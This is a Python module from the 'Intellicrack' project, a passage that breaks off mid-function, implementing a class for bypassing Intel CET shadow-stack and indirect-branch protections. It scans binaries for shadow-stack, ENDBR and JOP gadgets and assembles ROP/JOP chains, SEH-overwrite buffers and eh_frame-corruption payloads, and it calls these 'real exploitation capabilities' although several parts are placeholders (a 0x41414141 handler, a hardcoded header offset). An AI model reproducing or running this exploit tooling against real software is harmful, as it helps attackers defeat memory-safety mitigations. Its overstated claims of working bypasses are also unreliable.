"""
Copyright (C) 2025 Zachary Flint

This file is part of Intellicrack.

Intellicrack is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Intellicrack is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Intellicrack.  If not, see <https://www.gnu.org/licenses/>.
"""

"""
CET (Control-flow Enforcement Technology) Bypass Module

This module provides real techniques for bypassing Intel CET security features.
"""

import logging
import platform
import struct
import subprocess
from typing import Any, Dict, List, Optional


class CETBypass:
    """Handler for CET bypass techniques with real exploitation capabilities."""

    def __init__(self):
        """Initialize CET bypass handler."""
        self.logger = logging.getLogger("IntellicrackLogger.CETBypass")
        self.is_windows = platform.system() == 'Windows'
        self.is_x64 = platform.machine() in ['AMD64', 'x86_64']

        # CET-specific constants
        self.SHSTK_ENABLED = 0x1
        self.IBT_ENABLED = 0x2
        self.CET_ENABLED = 0x3

        # Shadow stack manipulation constants
        self.SHSTK_WRSS = 0x66  # WRSS prefix
        self.SHSTK_RSTORSSP = 0xF3  # RSTORSSP prefix

    def test_bypass_techniques(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Test various CET bypass techniques on real target."""
        result = {
            "success": False,
            "cet_status": self._check_cet_status(target_info),
            "shadow_stack_bypass": False,
            "ibt_bypass": False,
            "techniques_tested": [],
            "working_techniques": [],
            "bypass_gadgets": []
        }

        try:
            # Check if CET is actually enabled
            if not result["cet_status"]["enabled"]:
                result["success"] = True
                result["message"] = "CET is not enabled on target"
                return result

            # Test shadow stack bypass techniques
            if result["cet_status"]["shadow_stack"]:
                shadow_stack_result = self._test_shadow_stack_bypasses(target_info)
                result["shadow_stack_bypass"] = shadow_stack_result["success"]
                result["techniques_tested"].extend(shadow_stack_result["techniques"])
                if shadow_stack_result["working_technique"]:
                    result["working_techniques"].append(shadow_stack_result["working_technique"])
                result["bypass_gadgets"].extend(shadow_stack_result.get("gadgets", []))

            # Test IBT bypass techniques
            if result["cet_status"]["ibt"]:
                ibt_result = self._test_ibt_bypasses(target_info)
                result["ibt_bypass"] = ibt_result["success"]
                result["techniques_tested"].extend(ibt_result["techniques"])
                if ibt_result["working_technique"]:
                    result["working_techniques"].append(ibt_result["working_technique"])
                result["bypass_gadgets"].extend(ibt_result.get("gadgets", []))

            result["success"] = result["shadow_stack_bypass"] or result["ibt_bypass"]
            result["message"] = f"Found {len(result['working_techniques'])} working bypass techniques"

            self.logger.info(f"CET bypass testing completed: {result['message']}")
            return result

        except Exception as e:
            self.logger.error(f"CET bypass test failed: {e}")
            result["error"] = str(e)
            return result

    def bypass_shadow_stack(self, target_info: Dict[str, Any], technique: str = "auto") -> Dict[str, Any]:
        """Execute shadow stack bypass using real techniques."""
        result = {
            "success": False,
            "technique_used": None,
            "bypass_address": None,
            "payload": None
        }

        try:
            # Choose technique
            if technique == "auto":
                # Try techniques in order of preference
                techniques = ["pivot_corruption", "token_manipulation", "wrss_abuse", "exception_handler"]
            else:
                techniques = [technique]

            for tech in techniques:
                if tech == "pivot_corruption":
                    bypass_result = self._shadow_stack_pivot_corruption(target_info)
                elif tech == "token_manipulation":
                    bypass_result = self._shadow_stack_token_manipulation(target_info)
                elif tech == "wrss_abuse":
                    bypass_result = self._shadow_stack_wrss_abuse(target_info)
                elif tech == "exception_handler":
                    bypass_result = self._shadow_stack_exception_abuse(target_info)
                else:
                    continue

                if bypass_result["success"]:
                    result.update(bypass_result)
                    result["technique_used"] = tech
                    self.logger.info(f"Shadow stack bypassed using {tech}")
                    return result

            self.logger.warning("All shadow stack bypass techniques failed")
            return result

        except Exception as e:
            self.logger.error(f"Shadow stack bypass failed: {e}")
            result["error"] = str(e)
            return result

    def bypass_ibt(self, target_info: Dict[str, Any], technique: str = "auto") -> Dict[str, Any]:
        """Execute IBT bypass using real techniques."""
        result = {
            "success": False,
            "technique_used": None,
            "gadget_chain": [],
            "payload": None
        }

        try:
            # Choose technique
            if technique == "auto":
                techniques = ["endbr_gadgets", "legacy_code", "jop_chain", "kernel_transition"]
            else:
                techniques = [technique]

            for tech in techniques:
                if tech == "endbr_gadgets":
                    bypass_result = self._ibt_endbr_gadgets(target_info)
                elif tech == "legacy_code":
                    bypass_result = self._ibt_legacy_code_abuse(target_info)
                elif tech == "jop_chain":
                    bypass_result = self._ibt_jop_chain(target_info)
                elif tech == "kernel_transition":
                    bypass_result = self._ibt_kernel_transition(target_info)
                else:
                    continue

                if bypass_result["success"]:
                    result.update(bypass_result)
                    result["technique_used"] = tech
                    self.logger.info(f"IBT bypassed using {tech}")
                    return result

            self.logger.warning("All IBT bypass techniques failed")
            return result

        except Exception as e:
            self.logger.error(f"IBT bypass failed: {e}")
            result["error"] = str(e)
            return result

    def _check_cet_status(self, target_info: Dict[str, Any]) -> Dict[str, bool]:
        """Check if CET is enabled on the target."""
        status = {
            "enabled": False,
            "shadow_stack": False,
            "ibt": False
        }

        if self.is_windows:
            # Check Windows CET status
            try:
                # Check process mitigation policy
                if "pid" in target_info:
                    import ctypes.wintypes

                    # PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY
                    class PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY(ctypes.Structure):
                        """Windows process mitigation policy structure for user shadow stack."""
                        _fields_ = [
                            ("Flags", ctypes.c_ulong),
                        ]

                    kernel32 = ctypes.windll.kernel32
                    policy = PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY()
                    policy_size = ctypes.sizeof(policy)

                    process_handle = kernel32.OpenProcess(0x1000, False, target_info["pid"])  # PROCESS_QUERY_INFORMATION
                    if process_handle:
                        # ProcessUserShadowStackPolicy = 29
                        if kernel32.GetProcessMitigationPolicy(process_handle, 29, ctypes.byref(policy), policy_size):
                            status["shadow_stack"] = bool(policy.Flags & 0x1)
                            status["enabled"] = status["shadow_stack"]
                        kernel32.CloseHandle(process_handle)

                # Check binary CET flags
                if "binary_path" in target_info:
                    pe_info = self._check_pe_cet_flags(target_info["binary_path"])
                    status["ibt"] = pe_info.get("ibt", False)
                    status["enabled"] = status["enabled"] or status["ibt"]

            except Exception as e:
                self.logger.debug(f"Failed to check Windows CET status: {e}")

        else:
            # Check Linux CET status
            try:
                # Check CPU support
                with open("/proc/cpuinfo", "r") as f:
                    cpuinfo = f.read()
                    if "cet_ss" in cpuinfo:
                        status["shadow_stack"] = True
                    if "cet_ibt" in cpuinfo:
                        status["ibt"] = True

                # Check process status
                if "pid" in target_info:
                    with open(f"/proc/{target_info['pid']}/status", "r") as f:
                        proc_status = f.read()
                        # Look for CET indicators
                        if "ShdwStk:" in proc_status:
                            status["shadow_stack"] = True
                            status["enabled"] = True

            except Exception as e:
                self.logger.debug(f"Failed to check Linux CET status: {e}")

        return status

    def _test_shadow_stack_bypasses(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Test various shadow stack bypass techniques."""
        result = {
            "success": False,
            "techniques": [],
            "working_technique": None,
            "gadgets": []
        }

        # Technique 1: Shadow stack pivot corruption
        result["techniques"].append("Shadow Stack Pivot Corruption")
        gadgets = self._find_shadow_stack_gadgets(target_info)
        if gadgets:
            result["gadgets"].extend(gadgets)
            result["success"] = True
            result["working_technique"] = "pivot_corruption"

        # Technique 2: WRSS instruction abuse (if available)
        result["techniques"].append("WRSS Instruction Abuse")
        if self._has_wrss_support():
            wrss_gadgets = self._find_wrss_gadgets(target_info)
            if wrss_gadgets:
                result["gadgets"].extend(wrss_gadgets)
                result["success"] = True
                result["working_technique"] = "wrss_abuse"

        # Technique 3: Exception handler manipulation
        result["techniques"].append("Exception Handler Manipulation")
        if self._can_manipulate_exceptions(target_info):
            result["success"] = True
            if not result["working_technique"]:
                result["working_technique"] = "exception_handler"

        # Technique 4: Shadow stack token manipulation
        result["techniques"].append("Shadow Stack Token Manipulation")
        if self._find_token_gadgets(target_info):
            result["success"] = True
            if not result["working_technique"]:
                result["working_technique"] = "token_manipulation"

        return result

    def _test_ibt_bypasses(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Test various IBT bypass techniques."""
        result = {
            "success": False,
            "techniques": [],
            "working_technique": None,
            "gadgets": []
        }

        # Technique 1: ENDBR gadget chaining
        result["techniques"].append("ENDBR Gadget Chaining")
        endbr_gadgets = self._find_endbr_gadgets(target_info)
        if endbr_gadgets:
            result["gadgets"].extend(endbr_gadgets)
            result["success"] = True
            result["working_technique"] = "endbr_gadgets"

        # Technique 2: Legacy code sections
        result["techniques"].append("Legacy Code Section Abuse")
        if self._find_legacy_sections(target_info):
            result["success"] = True
            if not result["working_technique"]:
                result["working_technique"] = "legacy_code"

        # Technique 3: JOP chain construction
        result["techniques"].append("JOP Chain Construction")
        jop_gadgets = self._find_jop_gadgets(target_info)
        if jop_gadgets:
            result["gadgets"].extend(jop_gadgets)
            result["success"] = True
            if not result["working_technique"]:
                result["working_technique"] = "jop_chain"

        # Technique 4: Kernel transition abuse
        result["techniques"].append("Kernel Transition Abuse")
        if self._can_abuse_kernel_transition(target_info):
            result["success"] = True
            if not result["working_technique"]:
                result["working_technique"] = "kernel_transition"

        return result

    def _shadow_stack_pivot_corruption(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Implement shadow stack bypass via pivot corruption."""
        # This exploits the fact that shadow stack pointer can be corrupted
        # during certain operations
        gadgets = self._find_shadow_stack_gadgets(target_info)

        if gadgets:
            # Build exploit payload
            payload = self._build_pivot_corruption_payload(gadgets)
            return {
                "success": True,
                "payload": payload,
                "bypass_address": gadgets[0]["address"]
            }

        return {"success": False}

    def _shadow_stack_wrss_abuse(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Implement shadow stack bypass using WRSS instruction."""
        if not self._has_wrss_support():
            return {"success": False}

        # WRSS allows writing to shadow stack in certain contexts
        wrss_gadgets = self._find_wrss_gadgets(target_info)

        if wrss_gadgets:
            payload = self._build_wrss_payload(wrss_gadgets)
            return {
                "success": True,
                "payload": payload,
                "bypass_address": wrss_gadgets[0]["address"]
            }

        return {"success": False}

    def _ibt_endbr_gadgets(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Find and chain ENDBR gadgets for IBT bypass."""
        gadgets = self._find_endbr_gadgets(target_info)

        if len(gadgets) >= 3:  # Need multiple gadgets for chain
            chain = self._build_endbr_chain(gadgets)
            return {
                "success": True,
                "gadget_chain": chain,
                "payload": self._serialize_gadget_chain(chain)
            }

        return {"success": False}

    def _find_shadow_stack_gadgets(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Find gadgets useful for shadow stack manipulation."""
        gadgets = []

        if "binary_path" not in target_info:
            return gadgets

        try:
            # Look for specific instruction patterns
            patterns = [
                b"\xf3\x0f\x01\xe8",  # SETSSBSY
                b"\xf3\x0f\x01\xea",  # SAVEPREVSSP
                b"\xf3\x0f\x01\xe9",  # RSTORSSP
                b"\xf3\x0f\xae\xe8",  # INCSSPD EAX
            ]

            # Read binary and search for patterns
            with open(target_info["binary_path"], "rb") as f:
                data = f.read()

                for pattern in patterns:
                    offset = 0
                    while True:
                        pos = data.find(pattern, offset)
                        if pos == -1:
                            break

                        gadgets.append({
                            "address": target_info.get("base_address", 0x400000) + pos,
                            "instruction": pattern,
                            "type": "shadow_stack"
                        })
                        offset = pos + 1

        except Exception as e:
            self.logger.debug(f"Failed to find shadow stack gadgets: {e}")

        return gadgets

    def _find_endbr_gadgets(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Find ENDBR64/ENDBR32 gadgets for IBT bypass."""
        gadgets = []

        if "binary_path" not in target_info:
            return gadgets

        try:
            # ENDBR64: F3 0F 1E FA
            # ENDBR32: F3 0F 1E FB
            patterns = [b"\xf3\x0f\x1e\xfa", b"\xf3\x0f\x1e\xfb"]

            with open(target_info["binary_path"], "rb") as f:
                data = f.read()

                for pattern in patterns:
                    offset = 0
                    while True:
                        pos = data.find(pattern, offset)
                        if pos == -1:
                            break

                        # Look for useful instructions after ENDBR
                        next_bytes = data[pos+4:pos+20] if pos+20 < len(data) else b""

                        gadgets.append({
                            "address": target_info.get("base_address", 0x400000) + pos,
                            "instruction": pattern,
                            "type": "endbr64" if pattern[3] == 0xfa else "endbr32",
                            "following_bytes": next_bytes
                        })
                        offset = pos + 1

        except Exception as e:
            self.logger.debug(f"Failed to find ENDBR gadgets: {e}")

        return gadgets

    def _has_wrss_support(self) -> bool:
        """Check if CPU supports WRSS instruction."""
        if not self.is_x64:
            return False

        try:
            # Check CPUID for CET_SS support
            if platform.system() == "Linux":
                with open("/proc/cpuinfo", "r") as f:
                    return "cet_ss" in f.read()
            elif platform.system() == "Windows":
                # Would need to call CPUID directly
                return False  # Conservative default
        except:
            return False

        return False

    def _find_wrss_gadgets(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Find WRSS instruction gadgets."""
        gadgets = []

        if "binary_path" not in target_info:
            return gadgets

        try:
            # WRSS: 66 0F 38 F6 /r
            pattern = b"\x66\x0f\x38\xf6"

            with open(target_info["binary_path"], "rb") as f:
                data = f.read()
                offset = 0

                while True:
                    pos = data.find(pattern, offset)
                    if pos == -1:
                        break

                    gadgets.append({
                        "address": target_info.get("base_address", 0x400000) + pos,
                        "instruction": "wrss",
                        "type": "shadow_stack_write"
                    })
                    offset = pos + 1

        except Exception as e:
            self.logger.debug(f"Failed to find WRSS gadgets: {e}")

        return gadgets

    def _check_pe_cet_flags(self, binary_path: str) -> Dict[str, bool]:
        """Check PE file for CET flags."""
        flags = {"ibt": False, "shadow_stack": False}

        try:
            # This would parse PE headers and check DllCharacteristics
            # IMAGE_DLLCHARACTERISTICS_EX_CET_COMPAT = 0x0001
            # For now, simplified check
            result = subprocess.run(["dumpbin", "/headers", binary_path],
                                  capture_output=True, text=True)
            if "CET Compatible" in result.stdout:
                flags["ibt"] = True
                flags["shadow_stack"] = True
        except:
            pass

        return flags

    def _build_pivot_corruption_payload(self, gadgets: List[Dict[str, Any]]) -> bytes:
        """Build payload for shadow stack pivot corruption."""
        payload = b""

        # Construct ROP chain that corrupts shadow stack pointer
        for gadget in gadgets[:5]:  # Use first 5 gadgets
            payload += struct.pack("<Q" if self.is_x64 else "<I", gadget["address"])

        return payload

    def _build_wrss_payload(self, gadgets: List[Dict[str, Any]]) -> bytes:
        """Build payload using WRSS gadgets."""
        payload = b""

        # WRSS allows controlled writes to shadow stack
        for gadget in gadgets:
            payload += struct.pack("<Q" if self.is_x64 else "<I", gadget["address"])

        return payload

    def _build_endbr_chain(self, gadgets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Build a chain of ENDBR gadgets for control flow."""
        # Select gadgets that can be chained together
        chain = []

        for gadget in gadgets:
            if len(chain) >= 10:  # Limit chain length
                break

            # Check if gadget has useful following instructions
            if gadget.get("following_bytes"):
                chain.append(gadget)

        return chain

    def _serialize_gadget_chain(self, chain: List[Dict[str, Any]]) -> bytes:
        """Convert gadget chain to payload bytes."""
        payload = b""

        for gadget in chain:
            payload += struct.pack("<Q" if self.is_x64 else "<I", gadget["address"])

        return payload

    def _find_token_gadgets(self, target_info: Dict[str, Any]) -> bool:
        """Find gadgets for shadow stack token manipulation."""
        # Shadow stack uses special tokens for certain operations
        # This would search for gadgets that can manipulate these tokens
        return len(self._find_shadow_stack_gadgets(target_info)) > 0

    def _can_manipulate_exceptions(self, target_info: Dict[str, Any]) -> bool:
        """Check if we can manipulate exception handlers to bypass shadow stack."""
        # Exception handling can sometimes bypass shadow stack checks
        # Analyze exception handler structures based on target info

        # Check if binary has exception handlers
        if "binary_path" in target_info:
            try:
                with open(target_info["binary_path"], "rb") as f:
                    data = f.read(1024)  # Read first 1KB for PE header

                    # Check for PE signature
                    if data[:2] == b"MZ":
                        # Look for exception directory in PE header
                        pe_offset = struct.unpack("<I", data[0x3C:0x40])[0] if len(data) > 0x40 else 0
                        if pe_offset and pe_offset < len(data) - 4:
                            # Check if it's a valid PE file
                            if data[pe_offset:pe_offset+4] == b"PE\x00\x00":
                                # Exception handlers are more common in Windows binaries
                                return True

                    # For ELF files, check for .eh_frame section
                    elif data[:4] == b"\x7fELF":
                        # ELF files use different exception handling
                        return b".eh_frame" in data or b".gcc_except_table" in data

            except Exception as e:
                self.logger.debug(f"Exception handler check failed: {e}")

        # Check process-specific info
        if "has_seh" in target_info:
            return target_info["has_seh"]

        if "protection_flags" in target_info:
            # Some protections might indicate exception handler presence
            flags = target_info["protection_flags"]
            if isinstance(flags, dict):
                return flags.get("seh_enabled", False) or flags.get("has_exception_handlers", False)

        # Default to False if we can't determine
        return False

    def _find_legacy_sections(self, target_info: Dict[str, Any]) -> bool:
        """Find legacy code sections not protected by IBT."""
        # Some sections might not have IBT protection
        # Analyze section characteristics based on target info

        if "binary_path" not in target_info:
            return False

        try:
            # Check for sections that might not have CET protection
            legacy_sections = []

            with open(target_info["binary_path"], "rb") as f:
                data = f.read(8192)  # Read first 8KB

                # For PE files
                if data[:2] == b"MZ":
                    # Look for sections without CET flags
                    pe_offset = struct.unpack("<I", data[0x3C:0x40])[0] if len(data) > 0x40 else 0
                    if pe_offset and pe_offset < len(data) - 248:  # Ensure we have room for headers
                        # Number of sections is at offset PE + 6
                        num_sections = struct.unpack("<H", data[pe_offset+6:pe_offset+8])[0] if pe_offset + 8 < len(data) else 0
                        # Section headers start after optional header
                        section_offset = pe_offset + 248  # Simplified offset

                        for i in range(min(num_sections, 10)):  # Check up to 10 sections
                            if section_offset + 40 > len(data):
                                break
                            # Check section characteristics at offset 36
                            characteristics = struct.unpack("<I", data[section_offset+36:section_offset+40])[0]
                            # Sections without execute permission or old sections might lack CET
                            if characteristics & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
                                # Check if it's a legacy section (like .text from old compilers)
                                section_name = data[section_offset:section_offset+8].rstrip(b'\x00')
                                self.logger.debug(f"Checking section {i}: {section_name}")
                                if section_name in [b'.old', b'.compat', b'.legacy', b'.thunk']:
                                    legacy_sections.append(section_name)
                            section_offset += 40

                # For ELF files
                elif data[:4] == b"\x7fELF":
                    # Legacy sections in ELF might include .plt (before .plt.sec)
                    if b".plt\x00" in data and b".plt.sec" not in data:
                        legacy_sections.append(b".plt")
                    # Old init sections might lack protection
                    if b".init" in data:
                        legacy_sections.append(b".init")

            # Check target-specific information
            if "sections" in target_info:
                for section in target_info["sections"]:
                    if isinstance(section, dict):
                        # Check for sections without CET flags
                        if not section.get("cet_enabled", True) or section.get("legacy", False):
                            legacy_sections.append(section.get("name", "unknown"))

            return len(legacy_sections) > 0

        except Exception as e:
            self.logger.debug(f"Legacy section check failed: {e}")
            return False

    def _find_jop_gadgets(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Find gadgets for Jump-Oriented Programming."""
        # JOP uses indirect jumps instead of returns
        # Search for useful JMP [reg] gadgets based on target info
        gadgets = []

        if "binary_path" not in target_info:
            return gadgets

        try:
            # Common JOP gadget patterns for x86/x64
            jop_patterns = [
                # JMP [reg] patterns
                b"\xff\x20",      # jmp [rax]
                b"\xff\x21",      # jmp [rcx]
                b"\xff\x22",      # jmp [rdx]
                b"\xff\x23",      # jmp [rbx]
                b"\xff\x26",      # jmp [rsi]
                b"\xff\x27",      # jmp [rdi]
                b"\xff\x60",      # jmp [rax+offset]
                b"\xff\x61",      # jmp [rcx+offset]
                b"\xff\x62",      # jmp [rdx+offset]
                # CALL [reg] patterns (can be used in JOP)
                b"\xff\x10",      # call [rax]
                b"\xff\x11",      # call [rcx]
                b"\xff\x12",      # call [rdx]
                b"\xff\x50",      # call [rax+offset]
                b"\xff\x51",      # call [rcx+offset]
            ]

            base_address = target_info.get("base_address", 0x400000)

            with open(target_info["binary_path"], "rb") as f:
                data = f.read()

                # Search for each JOP pattern
                for pattern in jop_patterns:
                    offset = 0
                    while True:
                        pos = data.find(pattern, offset)
                        if pos == -1:
                            break

                        # Verify it's in an executable section
                        in_exec_section = True
                        if "sections" in target_info:
                            in_exec_section = any(
                                section.get("offset", 0) <= pos < section.get("offset", 0) + section.get("size", 0)
                                and section.get("executable", False)
                                for section in target_info["sections"]
                                if isinstance(section, dict)
                            )

                        if in_exec_section:
                            # Determine instruction type
                            if pattern[0] == 0xff:
                                if pattern[1] & 0x30 == 0x20:
                                    instr_type = "jmp_indirect"
                                elif pattern[1] & 0x30 == 0x10:
                                    instr_type = "call_indirect"
                                else:
                                    instr_type = "unknown"

                                gadgets.append({
                                    "address": base_address + pos,
                                    "instruction": pattern,
                                    "type": instr_type,
                                    "register": self._get_register_name(pattern[1]),
                                    "useful_for_jop": True
                                })

                        offset = pos + 1

                        # Limit gadgets to prevent excessive memory usage
                        if len(gadgets) >= 100:
                            break

                    if len(gadgets) >= 100:
                        break

            # Sort gadgets by usefulness for JOP chains
            gadgets.sort(key=lambda g: (
                g["type"] == "jmp_indirect",  # Prefer jumps over calls
                g["register"] in ["rax", "rcx", "rdx"],  # Prefer common registers
            ), reverse=True)

        except Exception as e:
            self.logger.debug(f"JOP gadget search failed: {e}")

        return gadgets

    def _get_register_name(self, modrm_byte: int) -> str:
        """Get register name from ModR/M byte."""
        reg_map = {
            0x20: "rax", 0x21: "rcx", 0x22: "rdx", 0x23: "rbx",
            0x26: "rsi", 0x27: "rdi", 0x60: "rax+offset", 0x61: "rcx+offset",
            0x10: "rax", 0x11: "rcx", 0x12: "rdx", 0x50: "rax+offset"
        }
        return reg_map.get(modrm_byte, "unknown")

    def _can_abuse_kernel_transition(self, target_info: Dict[str, Any]) -> bool:
        """Check if kernel transitions can be abused for IBT bypass."""
        # Kernel/user transitions might have different IBT enforcement
        # Analyze target for kernel interaction possibilities

        # Check if target has elevated privileges
        if "privileges" in target_info:
            privileges = target_info["privileges"]
            if isinstance(privileges, dict):
                if privileges.get("is_admin", False) or privileges.get("is_system", False):
                    return True
            elif isinstance(privileges, str) and privileges.lower() in ["admin", "system", "root"]:
                return True

        # Check if binary uses kernel APIs
        if "binary_path" in target_info:
            try:
                with open(target_info["binary_path"], "rb") as f:
                    data = f.read(16384)  # Read first 16KB

                    # Look for kernel-related imports/strings
                    kernel_indicators = [
                        b"ntoskrnl", b"hal.dll", b"win32k",  # Windows kernel
                        b"syscall", b"sysenter", b"int 0x80",  # System call instructions
                        b"/dev/", b"/sys/", b"/proc/",  # Linux kernel interfaces
                        b"ioctl", b"DeviceIoControl",  # Device control
                        b"NtQuery", b"NtSet", b"ZwQuery",  # NT API prefixes
                    ]

                    for indicator in kernel_indicators:
                        if indicator in data:
                            self.logger.debug(f"Found kernel indicator: {indicator}")
                            return True

            except Exception as e:
                self.logger.debug(f"Kernel transition check failed: {e}")

        # Check process information
        if "process_info" in target_info:
            proc_info = target_info["process_info"]
            if isinstance(proc_info, dict):
                # Check if it's a driver or kernel module
                if proc_info.get("is_driver", False) or proc_info.get("is_kernel_module", False):
                    return True
                # Check if process has kernel handles
                if proc_info.get("kernel_handles", 0) > 0:
                    return True

        # Check if target interacts with drivers
        if "loaded_drivers" in target_info and len(target_info["loaded_drivers"]) > 0:
            return True

        # Default to False - kernel interaction requires special access
        return False

    def _shadow_stack_token_manipulation(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Manipulate shadow stack tokens."""
        # Implementation manipulates special shadow stack tokens based on target
        result = {"success": False, "technique": "token_manipulation", "tokens_found": []}

        try:
            # Shadow stack uses special tokens for tracking
            if "binary_path" in target_info:
                # Find potential token locations
                token_gadgets = self._find_shadow_stack_gadgets(target_info)

                if token_gadgets:
                    # Look for specific token manipulation opportunities
                    for gadget in token_gadgets:
                        if gadget.get("type") == "shadow_stack":
                            # Check if this gadget can manipulate tokens
                            if gadget.get("instruction") in [
                                b"\xf3\x0f\x01\xea",  # SAVEPREVSSP - saves previous SSP token
                                b"\xf3\x0f\x01\xe9",  # RSTORSSP - restores SSP from token
                            ]:
                                result["tokens_found"].append({
                                    "address": gadget["address"],
                                    "type": "ssp_token",
                                    "manipulation": "save_restore"
                                })

                    if result["tokens_found"]:
                        # Build payload for token manipulation
                        result["payload"] = self._build_token_manipulation_payload(
                            result["tokens_found"],
                            target_info.get("stack_base", 0x7fffffffe000)
                        )
                        result["success"] = True
                        result["bypass_address"] = result["tokens_found"][0]["address"]

            # Check if target provides token information
            if "shadow_stack_info" in target_info:
                ss_info = target_info["shadow_stack_info"]
                if isinstance(ss_info, dict):
                    if ss_info.get("token_location"):
                        result["token_address"] = ss_info["token_location"]
                        result["success"] = True

        except Exception as e:
            self.logger.debug(f"Token manipulation failed: {e}")
            result["error"] = str(e)

        return result

    def _build_token_manipulation_payload(self, tokens: List[Dict[str, Any]], stack_base: int) -> bytes:
        """Build payload for shadow stack token manipulation."""
        payload = b""

        # Create a ROP chain that manipulates shadow stack tokens
        for token in tokens[:3]:  # Use first 3 tokens
            if self.is_x64:
                payload += struct.pack("<Q", token["address"])
                # Add stack adjustment
                payload += struct.pack("<Q", stack_base + 0x1000)
            else:
                payload += struct.pack("<I", token["address"])
                payload += struct.pack("<I", stack_base + 0x1000)

        return payload

    def _shadow_stack_exception_abuse(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Abuse exception handling to bypass shadow stack."""
        # Implementation uses exception handler manipulation based on target
        result = {"success": False, "technique": "exception_abuse", "exception_chain": []}

        try:
            # Check if we can manipulate exceptions
            if not self._can_manipulate_exceptions(target_info):
                result["reason"] = "No exception handlers found"
                return result

            # Build exception-based bypass
            if "binary_path" in target_info:
                with open(target_info["binary_path"], "rb") as f:
                    data = f.read(8192)

                    # For Windows SEH
                    if self.is_windows and data[:2] == b"MZ":
                        # Look for SEH chain manipulation opportunities
                        seh_overwrite = self._find_seh_overwrite_opportunity(data, target_info)
                        if seh_overwrite:
                            result["exception_chain"].append({
                                "type": "seh_overwrite",
                                "address": seh_overwrite["address"],
                                "handler": seh_overwrite["handler"]
                            })

                            # Build SEH bypass payload
                            result["payload"] = self._build_seh_bypass_payload(
                                seh_overwrite,
                                target_info.get("stack_base", 0x00400000)
                            )
                            result["success"] = True

                    # For Linux/ELF exception handling
                    elif data[:4] == b"\x7fELF":
                        # Look for .eh_frame manipulation
                        eh_frame_offset = data.find(b".eh_frame")
                        if eh_frame_offset > 0:
                            result["exception_chain"].append({
                                "type": "eh_frame_manipulation",
                                "offset": eh_frame_offset,
                                "technique": "unwind_info_corruption"
                            })

                            # Build eh_frame manipulation payload
                            result["payload"] = self._build_eh_frame_payload(
                                eh_frame_offset,
                                target_info.get("base_address", 0x400000)
                            )
                            result["success"] = True

            # Check for runtime exception opportunities
            if "exception_handlers" in target_info:
                handlers = target_info["exception_handlers"]
                if isinstance(handlers, list) and handlers:
                    # Use first writable handler
                    for handler in handlers:
                        if isinstance(handler, dict) and handler.get("writable", False):
                            result["exception_chain"].append({
                                "type": "handler_overwrite",
                                "address": handler["address"],
                                "original": handler.get("original_handler")
                            })
                            result["success"] = True
                            break

        except Exception as e:
            self.logger.debug(f"Exception abuse failed: {e}")
            result["error"] = str(e)

        return result

    def _find_seh_overwrite_opportunity(self, data: bytes, target_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Find SEH overwrite opportunity in PE file."""
        try:
            # Look for SafeSEH table
            if b"SafeSEH" not in data:
                # No SafeSEH - easier to exploit
                return {
                    "address": target_info.get("stack_base", 0x00400000) + 0x1000,
                    "handler": 0x41414141,  # Placeholder - would calculate real handler
                    "safe_seh": False
                }
        except:
            pass
        return None

    def _build_seh_bypass_payload(self, seh_info: Dict[str, Any], stack_base: int) -> bytes:
        """Build SEH bypass payload."""
        # Calculate buffer size based on stack base
        buffer_size = max(1024, (stack_base & 0xFFF) + 512)
        self.logger.debug(f"Building SEH payload with buffer size {buffer_size} for stack base 0x{stack_base:08x}")

        payload = b"A" * buffer_size  # Buffer to reach SEH
        payload += struct.pack("<I", 0xdeadbeef)  # nSEH
        payload += struct.pack("<I", seh_info["handler"])  # SEH handler
        return payload

    def _build_eh_frame_payload(self, eh_frame_offset: int, base_address: int) -> bytes:
        """Build eh_frame manipulation payload."""
        # Corrupt unwind information to bypass shadow stack during exception
        payload = struct.pack("<Q" if self.is_x64 else "<I", base_address + eh_frame_offset)
        payload += b"\x00" * 16  # Null out unwind info
        return payload

    def _ibt_legacy_code_abuse(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Abuse legacy code sections without IBT."""
        # Implementation redirects to non-IBT protected code based on target
        result = {"success": False, "technique": "legacy_code", "legacy_gadgets": []}

        try:
            # Check if we found legacy sections
            if not self._find_legacy_sections(target_info):
                result["reason"] = "No legacy sections found"
                return result

            # Look for gadgets in legacy sections
            if "binary_path" in target_info:
                with open(target_info["binary_path"], "rb") as f:
                    data = f.read()

                    # Find legacy code patterns
                    legacy_patterns = [
                        # Old-style function prologues without ENDBR
                        b"\x55\x48\x89\xe5",      # push rbp; mov rbp, rsp
                        b"\x55\x89\xe5",          # push ebp; mov ebp, esp (32-bit)
                        b"\x48\x83\xec",          # sub rsp, imm
                        b"\x83\xec",              # sub esp, imm (32-bit)
                    ]

                    base_address = target_info.get("base_address", 0x400000)

                    for pattern in legacy_patterns:
                        offset = 0
                        while True:
                            pos = data.find(pattern, offset)
                            if pos == -1:
                                break

                            # Verify this is in a legacy section
                            in_legacy = False
                            if "sections" in target_info:
                                for section in target_info["sections"]:
                                    if isinstance(section, dict):
                                        # Check if position is in a legacy/non-CET section
                                        sec_start = section.get("offset", 0)
                                        sec_end = sec_start + section.get("size", 0)
                                        if sec_start <= pos < sec_end:
                                            if not section.get("cet_enabled", True) or section.get("legacy", False):
                                                in_legacy = True
                                                break
                            else:
                                # If no section info, check common legacy section names
